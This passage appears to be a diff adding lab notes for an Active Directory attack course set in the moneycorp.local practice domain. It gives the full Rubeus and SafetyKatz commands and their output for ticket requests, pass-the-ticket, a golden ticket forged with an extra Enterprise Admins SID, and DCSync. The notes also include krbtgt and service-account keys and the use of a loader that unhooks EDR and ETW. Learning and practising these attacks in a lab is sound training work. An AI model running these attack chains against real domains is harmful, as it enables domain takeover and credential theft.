eXrlo0t3urjfi1If5+e3xbkk2yoMbDMs9ur/6deKkuaFRoP+VpxiWLBFTbgntyqkMH8iMxmNIOVU2NG8GYisdM2fVduLcJ/DPQah7vXH4ugYcFy1AUbV2Rzg60tkWgRrMt9EoXLbdcMxfKL9+Gg3mvZopt3GEp3SwFttLba0DhN3VcxDFPZKZyjYaFzFhg2j2HXKHNbJL5jPkivCUZhjXo3i0QHgOGspcWhIu/Z4wgJ41ft/LVr1Ja0tBt9cRaQ2AXdW2NSPJEUT+wq5r2EE3L0MLJ/SFC/PlhAk6GHu54Fx/wjQ2Jwrte3YHIQxQ155fE7lPhhb4N0kVi0cA6g08aWXa4EzAtb5GCzx+0edGVwApHFCe5o9f7u414b/L6+W6IaK8s5LGKsFvlgWw7g7cOiaOCAR4wggEaoAMCAQCiggERBIIBDX2CAQkwggEFoIIBATCB/jCB+6AbMBmgAwIBF6ESBBDG6HAcAVDuMhVqghjMVdyEoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDI1MDkyOTIxMDIzNlqlERgPMjAyNTA5MjkyMTAyMzZaphEYDzIwMjUwOTMwMDcwMjM2WqcRGA8yMDI1MTAwNjIxMDIzNlqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0Z3QbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FM
+
+
+
+
+C:\AD\Tools>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'http/mcorp-dc.MONEYCORP.LOCAL'
+[*] Using domain controller: mcorp-dc.MONEYCORP.LOCAL (172.16.1.1)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  http/mcorp-dc.MONEYCORP.LOCAL
+  ServiceRealm             :  MONEYCORP.LOCAL
+  UserName                 :  Administrator (NT_PRINCIPAL)
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  StartTime                :  9/29/2025 2:03:26 PM
+  EndTime                  :  9/30/2025 12:02:36 AM
+  RenewTill                :  10/6/2025 2:02:36 PM
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  IMQ+JPBEXLjKRLCbtA3NSDgctYDCysbvHW07rAx+5h4=
+```
+
+### Once the ticket is injected, we can access mcorp-dc
+
+* C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+```
+
+* C:\Users\Administrator.dcorp>set username
+```
+set username
+USERNAME=Administrator
+```
+
+* C:\Users\Administrator.dcorp>set computername
+```
+set computername
+COMPUTERNAME=MCORP-DC
+```
+
+### Learning Objective 19:
+```
+• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admins using 
+dollarcorp's krbtgt hash
+```
+
+We already have the krbtgt hash from dcorp-dc. Let's create the inter-realm TGT and inject. 
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
+
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
+[*] Action: Build TGT
+
+[*] Building PAC
+
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
+[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : krbtgt
+[*] Target         : dollarcorp.moneycorp.local
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'
+
+[*] AuthTime       : 9/29/2025 2:09:40 PM
+[*] StartTime      : 9/29/2025 2:09:40 PM
+[*] EndTime        : 9/30/2025 12:09:40 AM
+[*] RenewTill      : 10/6/2025 2:09:40 PM
+
+[*] base64(ticket.kirbi):
+
+      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
+
+
+[+] Ticket successfully imported!
+```
+
+We can now access mcorp-dc
+
+* C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
+
+* C:\Users\Administrator.dcorp> set computername
+```
+set username
+USERNAME=Administrator
+```
+
+* C:\Users\Administrator.dcorp>set computername
+```
+set computername
+COMPUTERNAME=MCORP-DC
+```
+
+We can also execute the DCSync attacks against moneycorp. Use the following command in the above 
+prompt where we injected the ticket
+
+* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+
+
+## Learning Objective 20:
+```
+• With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the 
+DC of eurocorp.local forest.
+```
+
+Extract the trust key
+
+We need the trust key for the trust between dollarcorp and eurocrop, which can be retrieved using 
+Mimikatz or SafetyKatz.
+
+Start a process with DA privileges. Run the below command from an elevated command prompt
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+[*] Action: Ask TGT
+
+[*] Got domain: dollarcorp.moneycorp.local
+[*] Showing process : True
+[*] Username        : JFJ78ZP3
+[*] Domain          : JE6GOWRV
+[*] Password        : BT289DZX
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 3160
+[+] LUID            : 0x7c3597
+
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
+[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
+[*] Target LUID : 8140183
+[*] Using domain controller: 172.16.2.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGAjCCBf6gAwIBBaEDAgEWooIE2TCCBNVhggTRMIIEzaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC
+      BHUwggRxoAMCARKhAwIBAqKCBGMEggRfwEgeWxEkm/8qITgUL7MGeG5eXtTpJix52prjGiyAJ90EJpIl
+      CaxDjhJH6od9pfa+72AoIsFAV1TE1MrYEJOdm3C0LSLeEu7HWGoggso168tqqchKhivLogeodA8HExkK
+      jvMuqmq/gg1ECZguwIb3dsWKWXqsa3VXNDt+IHGkamBssObIhSXlqb4HWMwBrs6HxmpZUEx8e28vmgge
+      te3wd4rcekS0BcZ0kZQPH/SYIgCmvDgf4f5S3YXpG4bdlUQQU5s7OArDRexYFNrC/SMZqDlrcYq/Ab/j
+      vJD3Dp6bAJUYiOB2QXMABazdhOIxeq1H4y4H1nWmfCa0K2J8o4p5medl2jtIcvxv0pSjYBcI0WxmIMIl
+      Ke/m4HRYchswb8Af3nwF6SmnJqexpGUKUb3S3kbxUL67T4tVTcISunQy6hY6WeOPbvtkVJXnGj8rWW3s
+      6znzCWlepP19e7tPE6XFNO8rI04rIeegerr207CTp0W5VPAE4ekGIG5O9ADx47N7sJd7oJwXidI7h28K
+      190bS9NO6bBm0UEvyq05QguwKtFIg5IqVPKxa7qv/Dnx/RexlPP3NpSPquFmQkm7Rh7TPnF3m6Ric8lz
+      btwWGwvn7MBXBRzwbes+o4xlJ11WpNWAEwSiUHD7fv1nusq9X/pHmhDpkGf+age87cdHTYDTIGXa8bYv
+      2AIdPikmqPIOR05Cldi5hus0kM3nhkcZj2helbwXql6geoLng/BlMxKe8zvezeEpUVCtlAndTzDQPqmA
+      7ZzehoVtpz9H6+P2vM/hUa2NARYHFliaU3iapDDOIQidwAt17Ep8snswm3x4Zo1VS/VXBh+vLE4fS4ND
+      y9ntYf/nGBH8kSP9Hw4I/gpkO5kLcvNEcOoyAdnCRqvuclNWuQaauDIOIZC0KDCBnUr7AETfA+1Pr9qE
+      eB1urpUVs2ZdBs7psbRM23i0E4kkrbQBRoqk/JCPFV3oDWxLi5K+7P1O2SZsZe+oQ0sDxNdES46npgWd
+      +d3Ce6jjEvvFksr9jd4Zr9IYsLFbMOs6woKuVlaMBc1DT0mk3ZhRxbkGwDQj5KBMdEltAFSs+eLqF8YE
+      9aQ4dV3a9eyHLX7Gp2RJlOX0H+zPEvLccqMudL2hvae1GQnEQA0xru5r2WU+yEzg52SjjRLKybOws3OX
+      DRqiyMk/0a+JYcZZ6b+xyt/XSKsM3qWcbYyNWa2IbX6hYVu/0mwYsG8azSfa0C8pGYQmU7Ny81X/MGAL
+      tSoKSkb+Noer5en/2RLhBQ0/kfec5cV2eT7ik4QsKIjdj/Rs08c0pr0TE94XfUMAtLN/ZZ9Pmz2gc0Ji
+      0RVCUM9Wxc3Og/G2ZihBNNxv9Ka+xeO6egzsnexXuHTMQzctPVMHesyboyREfj4+6XRP65awYm6kcJ6n
+      8cieyOPUsXSI9lwl21G5LJpZ4+lCgNCe5Pf7LHbFmA5c1u5x60Fz8V3vOxaA9hgbJVdDL5g869ZkpxGw
+      dd2Ro4IBEzCCAQ+gAwIBAKKCAQYEggECfYH/MIH8oIH5MIH2MIHzoCswKaADAgESoSIEIKgQrZ3BDFMC
+      Boj7MmB866IZ2Qav1m7wKbg3wtKIG7syoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohUwE6AD
+      AgEBoQwwChsIc3ZjYWRtaW6jBwMFAEDhAAClERgPMjAyNTA5MzAwMDA1MjNaphEYDzIwMjUwOTMwMTAw
+      NTIzWqcRGA8yMDI1MTAwNzAwMDUyM1qoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMC
+      AQKhJjAkGwZrcmJ0Z3QbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FM
+[*] Target LUID: 0x7c3597
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
+  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
+  UserName                 :  svcadmin (NT_PRINCIPAL)
